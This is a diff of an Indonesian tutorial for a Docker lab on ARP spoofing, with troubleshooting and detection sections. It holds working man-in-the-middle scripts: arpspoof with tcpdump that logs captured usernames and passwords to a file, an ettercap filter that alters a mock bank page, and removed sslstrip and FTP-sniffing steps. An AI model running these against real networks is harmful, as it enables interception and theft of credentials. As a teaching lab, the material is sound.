 
-# Login FTP dari target ke dirinya sendiri (atau ke server lain)
-ftp localhost
-# Login dengan username/password
-
-# Di attacker, jalankan tcpdump atau ettercap
-tcpdump -i eth0 port 21 -A
-# Akan terlihat username dan password dalam plain text
+# Ini akan menangkap HTTP POST method saja
 ```
 
-### Latihan 3: Script ARP Spoofing Otomatis
+### Latihan 3: Script ARP Spoofing dengan Logging
 
 ```bash
-cat > auto_arpspoof.sh << 'EOF'
+cat > /tmp/arp_mitm.sh << 'EOF'
 #!/bin/bash
-# Auto ARP Spoofing dengan cleanup
 
 TARGET="192.168.1.10"
-GATEWAY="192.168.1.1"
+WEBSERVER="192.168.1.200"
 INTERFACE="eth0"
+LOGFILE="/shared/credentials.log"
 
-echo "[+] Mengaktifkan IP forwarding"
+cleanup() {
+    echo "Membersihkan..."
+    kill $PID1 $PID2 2>/dev/null
+    echo 0 > /proc/sys/net/ipv4/ip_forward
+    exit
+}
+
+trap cleanup INT
+
+echo "Memulai ARP Spoofing MITM"
+echo "Target: $TARGET -> $WEBSERVER"
+echo "Log: $LOGFILE"
+
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
-echo "[+] Memulai ARP spoofing"
-arpspoof -i $INTERFACE -t $TARGET $GATEWAY > /dev/null 2>&1 &
+arpspoof -i $INTERFACE -t $TARGET $WEBSERVER > /dev/null &
 PID1=$!
-arpspoof -i $INTERFACE -t $GATEWAY $TARGET > /dev/null 2>&1 &
+arpspoof -i $INTERFACE -t $WEBSERVER $TARGET > /dev/null &
 PID2=$!
 
-echo "[+] Serangan berjalan. PID: $PID1, $PID2"
-echo "[+] Tekan Enter untuk berhenti..."
-read
+# Sniff dan extract password
+tcpdump -i $INTERFACE -A -l port 80 2>/dev/null | while read line; do
+    if echo "$line" | grep -q "POST"; then
+        echo "$(date): POST Request" >> $LOGFILE
+    elif echo "$line" | grep -q "username="; then
+        echo "CRED: $line" >> $LOGFILE
+        echo "$(date): Credential ditemukan - $line"
+    fi
+done
 
-echo "[+] Menghentikan serangan..."
-kill $PID1 $PID2
-
-echo "[+] Membersihkan ARP cache..."
-arp -d $TARGET 2>/dev/null
-arp -d $GATEWAY 2>/dev/null
-
-echo "[+] Mematikan IP forwarding"
-echo 0 > /proc/sys/net/ipv4/ip_forward
-
-echo "[+] Selesai"
+wait
 EOF
 
-chmod +x auto_arpspoof.sh
-./auto_arpspoof.sh
+chmod +x /tmp/arp_mitm.sh
+/tmp/arp_mitm.sh
 ```
 
-### Latihan 4: Ettercap Filter
+### Latihan 4: Ettercap Filter untuk Ganti Konten
 
 ```bash
-# Buat filter untuk mengganti konten website
-cat > replace.filter << EOF
-if (ip.proto == TCP && tcp.dst == 80) {
-    if (search(DATA.data, "Accept-Encoding")) {
-        replace("Accept-Encoding", "Accept-Rubbish!");
-        msg("ZIP compressed files disabled\n");
-    }
-}
+# Buat filter untuk memodifikasi response
+cat > /tmp/modify.filter << 'EOF'
 if (ip.proto == TCP && tcp.src == 80) {
-    if (search(DATA.data, "<title>")) {
-        replace("<title>", "<title>[SPOOFED] ");
-        msg("Title spoofed\n");
+    if (search(DATA.data, "Bank Lokal")) {
+        replace("Bank Lokal", "Bank PALSU (DISADAP)");
+        msg("Konten dimodifikasi\n");
+    }
+    if (search(DATA.data, "Login Berhasil")) {
+        replace("Login Berhasil", "Login Diproses... (data dicuri)");
+        msg("Login message dimodifikasi\n");
     }
 }
 EOF
 
-# Compile filter
-etterfilter replace.filter -o replace.ef
+# Compile
+etterfilter /tmp/modify.filter -o /tmp/modify.ef
 
-# Jalankan dengan filter
-ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.1// -F replace.ef
+# Jalankan
+ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.200// -F /tmp/modify.ef
 ```
 
-### Latihan 5: HTTPS Stripping (SSL Strip)
+### Latihan 5: Monitor ARP Table dengan Python
 
 ```bash
-# Install sslstrip
-apt install -y sslstrip
-
-# Setup iptables untuk redirect HTTP ke sslstrip
-iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
-
-# Jalankan ARP spoofing di background
-arpspoof -i eth0 -t 192.168.1.10 192.168.1.1 &
-arpspoof -i eth0 -t 192.168.1.1 192.168.1.10 &
-
-# Jalankan sslstrip
-sslstrip -l 8080 -w sslstrip.log
-
-# Korban akan diarahkan ke HTTP meskipun mengetik HTTPS
-# Lihat log
-tail -f sslstrip.log
-```
-
-### Latihan 6: Deteksi dengan Python
-
-```bash
-cat > arp_detector.py << 'EOF'
+cat > /tmp/arp_monitor.py << 'EOF'
 #!/usr/bin/env python3
 import subprocess
 import time
-from collections import defaultdict
+import sys
+from datetime import datetime
 
-def get_arp_table():
+def get_arp():
     result = subprocess.run(['arp', '-n'], capture_output=True, text=True)
-    lines = result.stdout.split('\n')[1:-1]
+    lines = result.stdout.strip().split('\n')[1:]
     
     arp_table = {}
     for line in lines:
@@ -732,72 +868,153 @@ def get_arp_table():
             ip = parts[0]
             mac = parts[2]
             arp_table[ip] = mac
-    
     return arp_table
 
-def detect_arp_spoof():
-    print("Monitoring ARP table...")
-    history = defaultdict(list)
+def monitor(interval=2):
+    print(f"Monitoring ARP table setiap {interval} detik")
+    print("-" * 50)
+    
+    prev_arp = get_arp()
     
     try:
         while True:
-            current = get_arp_table()
+            time.sleep(interval)
+            current_arp = get_arp()
             
-            for ip, mac in current.items():
-                if ip != "192.168.1.1":  # Skip gateway
-                    continue
-                    
-                if mac not in history[ip]:
-                    history[ip].append(mac)
-                    print(f"[!] Perubahan terdeteksi untuk {ip}")
-                    print(f"    MAC baru: {mac}")
-                    print(f"    Riwayat: {history[ip]}")
-                    
-                    if len(history[ip]) > 1:
-                        print(f"[ALERT] ARP Spoofing terdeteksi untuk {ip}!")
+            for ip, mac in current_arp.items():
+                if ip in prev_arp and prev_arp[ip] != mac:
+                    print(f"[{datetime.now().strftime('%H:%M:%S')}] ⚠️ PERUBAHAN: {ip}")
+                    print(f"    Sebelum: {prev_arp[ip]}")
+                    print(f"    Sekarang: {mac}")
             
-            time.sleep(3)
+            prev_arp = current_arp
             
     except KeyboardInterrupt:
         print("\nMonitoring dihentikan")
 
 if __name__ == "__main__":
-    detect_arp_spoof()
+    monitor()
 EOF
 
-chmod +x arp_detector.py
-python3 arp_detector.py
+python3 /tmp/arp_monitor.py
 ```
 
-### Latihan 7: Cleanup Script
+### Latihan 6: Test dengan HTTP/HTTPS
 
 ```bash
-cat > cleanup_arp.sh << 'EOF'
+# Di webserver, setup HTTPS sederhana
+cd ~/netsec-lab
+docker-compose exec webserver bash
+
+# Install openssl
+apt update && apt install -y openssl
+
+# Generate self-signed cert
+mkdir -p /etc/apache2/ssl
+openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
+  -keyout /etc/apache2/ssl/server.key \
+  -out /etc/apache2/ssl/server.crt \
+  -subj "/CN=bank.local"
+
+# Enable SSL
+a2enmod ssl
+a2ensite default-ssl
+
+# Restart Apache
+service apache2 restart
+
+# Test dari target
+curl -k https://192.168.1.200
+```
+
+### Latihan 7: Cleanup Script Lengkap
+
+```bash
+cat > /tmp/cleanup_all.sh << 'EOF'
 #!/bin/bash
-# Membersihkan semua efek ARP spoofing
 
-echo "[+] Mematikan IP forwarding"
-echo 0 > /proc/sys/net/ipv4/ip_forward
+echo "Membersihkan semua efek serangan..."
 
-echo "[+] Membunuh proses arpspoof"
+# Matikan proses
 killall arpspoof 2>/dev/null
+killall ettercap 2>/dev/null
+killall tcpdump 2>/dev/null
 
-echo "[+] Membersihkan ARP cache semua host"
-for ip in 192.168.1.{1,10,100}; do
-    arp -d $ip 2>/dev/null
+# Matikan IP forwarding
+for container in kali-attacker router; do
+    docker exec $container sh -c "echo 0 > /proc/sys/net/ipv4/ip_forward" 2>/dev/null
 done
 
-echo "[+] Membersihkan aturan iptables"
-iptables -t nat -F
+# Bersihkan ARP cache di semua container
+for container in ubuntu-target ubuntu-target2 webserver fake-webserver; do
+    docker exec $container sh -c "ip neigh flush all" 2>/dev/null
+done
 
-echo "[+] Menghapus file temporary"
-rm -f *.pcap *.log *.ef
+# Bersihkan iptables di router
+docker exec router sh -c "iptables -t nat -F" 2>/dev/null
 
-echo "[+] Selesai. Tunggu 30 detik untuk ARP normal kembali."
+# Hapus file sementara
+rm -f /shared/*.pcap /shared/*.log /tmp/*.ef /tmp/*.filter 2>/dev/null
+
+echo "Selesai! Jaringan kembali normal."
+echo "Catatan: ARP cache akan pulih dalam beberapa menit."
 EOF
 
-chmod +x cleanup_arp.sh
-./cleanup_arp.sh
+chmod +x /tmp/cleanup_all.sh
+/tmp/cleanup_all.sh
+```
+
+---
+
+## 9. Troubleshooting
+
+### Masalah: Container tidak bisa saling ping
+```bash
+# Cek network
+docker network ls
+docker network inspect netsec_network
+
+# Pastikan semua container terhubung
+docker-compose ps
+```
+
+### Masalah: Web server tidak bisa diakses
+```bash
+# Cek log webserver
+docker-compose logs webserver
+
+# Test dari dalam container
+docker-compose exec webserver curl http://localhost
+```
+
+### Masalah: arpspoof command not found
+```bash
+# Install di attacker
+docker-compose exec kali-attacker bash
+apt update
+apt install -y dsniff
+```
+
+### Masalah: IP forwarding tidak aktif
+```bash
+# Set manual di setiap container
+docker exec kali-attacker sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
+docker exec router sh -c "echo 1 > /proc/sys/net/ipv4/ip_forward"
+```
+
+### Masalah: MAC address berubah
+```bash
+# Catat MAC asli setiap container
+for container in ubuntu-target webserver fake-webserver router; do
+    echo -n "$container: "
+    docker exec $container cat /sys/class/net/eth0/address
+done
+```
+
+### Masalah: Permission denied saat write file
+```bash
+# Gunakan folder shared yang sudah di-mount
+# Semua container bisa akses /shared
 ```
 
 ---
@@ -806,28 +1023,37 @@ chmod +x cleanup_arp.sh
 
 | Fungsi | Perintah |
 |--------|----------|
-| Lihat ARP table | `arp -n` atau `ip neigh show` |
-| ARP spoof 1 arah | `arpspoof -i eth0 -t 192.168.1.10 192.168.1.1` |
-| ARP spoof 2 arah | Jalankan 2 perintah arpspoof (target dan gateway) |
-| Aktifkan forwarding | `echo 1 > /proc/sys/net/ipv4/ip_forward` |
-| Sniffing dengan tcpdump | `tcpdump -i eth0 -n -A` |
-| Ettercap text mode | `ettercap -T -i eth0 -M arp:remote /target// /gateway//` |
-| Ettercap dengan plugin | `ettercap -T -i eth0 -M arp:remote // // -P dns_spoof` |
-| Static ARP | `arp -s 192.168.1.1 00:11:22:33:44:55` |
-| DNS spoof file | `/etc/ettercap/etter.dns` |
-| SSL Strip | `sslstrip -l 8080` |
-| Iptables redirect | `iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080` |
+| Start lab | `cd ~/netsec-lab && docker-compose up -d` |
+| Stop lab | `docker-compose down` |
+| Lihat container | `docker-compose ps` |
+| Masuk attacker | `docker-compose exec kali-attacker bash` |
+| Masuk target | `docker-compose exec ubuntu-target bash` |
+| Masuk webserver | `docker-compose exec webserver bash` |
+| Lihat ARP table | `arp -n` |
+| ARP spoof | `arpspoof -i eth0 -t 192.168.1.10 192.168.1.200` |
+| IP forwarding | `echo 1 > /proc/sys/net/ipv4/ip_forward` |
+| Sniff HTTP | `tcpdump -i eth0 -A port 80` |
+| Ettercap | `ettercap -T -i eth0 -M arp:remote /192.168.1.10// /192.168.1.200//` |
+| DNS spoof | `ettercap -T -i eth0 -M arp:remote // // -P dns_spoof` |
+| Static ARP | `arp -s 192.168.1.200 02:42:c0:a8:01:c8` |
+| Lihat MAC | `cat /sys/class/net/eth0/address` |
+| Cleanup | `/tmp/cleanup_all.sh` |
 
 ---
 
 ## ⚠️ Catatan Penting
 
-1. **Legalitas**: Praktik ini hanya untuk pembelajaran di lab sendiri. ARP spoofing di jaringan orang lain adalah ILEGAL.
+1. **Legalitas**: Praktik ini HANYA untuk pembelajaran di lab sendiri. ARP spoofing di jaringan orang lain adalah ILEGAL.
 
-2. **Deteksi**: ARP spoofing mudah dideteksi dengan tools monitoring.
+2. **Website Lokal**: Semua website dalam lab ini (asli dan palsu) dibuat khusus untuk demonstrasi.
 
-3. **Pencegahan**: Gunakan enkripsi (HTTPS, SSH, VPN) untuk melindungi data meskipun terjadi ARP spoofing.
+3. **Deteksi**: ARP spoofing mudah dideteksi dengan monitoring ARP table.
 
-4. **Edukasi**: Materi ini untuk memahami kelemahan protokol dan cara melindunginya.
+4. **Pencegahan**: 
+   - Gunakan static ARP untuk server penting
+   - Gunakan HTTPS meskipun dengan self-signed certificate
+   - Monitor perubahan ARP table
 
-5. **Bersih-bersih**: Selalu jalankan cleanup script setelah selesai praktik untuk mengembalikan jaringan ke kondisi normal.
+5. **Bersih-bersih**: Selalu jalankan cleanup script setelah selesai praktik.
+
+6. **MAC Address**: Catat MAC address asli setiap container untuk deteksi.
